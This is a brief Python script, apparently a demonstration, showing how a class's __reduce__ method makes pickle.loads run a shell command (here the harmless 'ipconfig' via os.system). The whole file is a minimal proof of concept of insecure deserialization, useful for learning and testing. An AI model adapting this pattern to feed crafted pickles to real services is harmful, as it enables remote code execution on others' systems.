import pickle
import os
class TestPickle(object):
    def __reduce__(self) :
        return os.system,('ipconfig',)

payload=pickle.dumps(TestPickle())
print(payload)
print(pickle.loads(payload))